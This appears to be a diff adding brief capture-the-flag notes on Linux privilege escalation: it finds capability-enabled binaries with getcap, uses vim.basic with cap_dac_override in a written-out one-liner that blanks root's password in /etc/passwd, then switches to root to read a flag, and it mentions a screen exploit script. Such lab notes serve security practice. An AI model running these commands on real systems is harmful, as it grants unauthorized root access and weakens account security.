@@ -1,0 +1,22 @@
+##### Capabilities
+find exploitible capabilities
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+look for cap_dac_override+eip which grants full
+
+we find /usr/bin/vim.basic which shows as exploitible. Lets use that to edit passwd to remove "x" and allow for any user to su to root account.
+su to root and cat the flag.txt
+
+{flag found}
+
+one liner:
+
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; | grep cap_dac_override+eip | awk '{print $1}' | if [[ "$(awk '{print $1}')" == *"vim.basic"* ]]; then (echo "before" && cat /etc/passwd | head -n1 && echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd && echo "after" && cat /etc/passwd | head -n1) else (echo "FAILED CONDITION") fi && su -c "cat flag.txt" -l root
+
+##### Vulnerable Services
+check screen version
+screen -v
+
+use Screen_Exploit_POC.sh
+
+cat /root/screen_exploit/flag.txt
